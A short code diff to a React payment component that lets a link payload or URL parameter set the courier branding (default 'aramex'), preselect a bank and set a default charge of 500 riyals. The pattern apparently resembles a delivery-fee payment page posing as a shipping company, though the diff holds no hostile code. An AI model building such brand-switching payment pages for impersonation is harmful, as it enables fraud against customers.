@@ -28,12 +28,14 @@ const PaymentBankSelector = () => {
   const preselectedBank = linkData?.payload?.selected_bank;
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  
+  // Get service info from link data (more reliable)
+  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
   const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
+  const amount = shippingInfo?.cod_amount || shippingInfo?.total_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
   // Load banks when country is available from link data
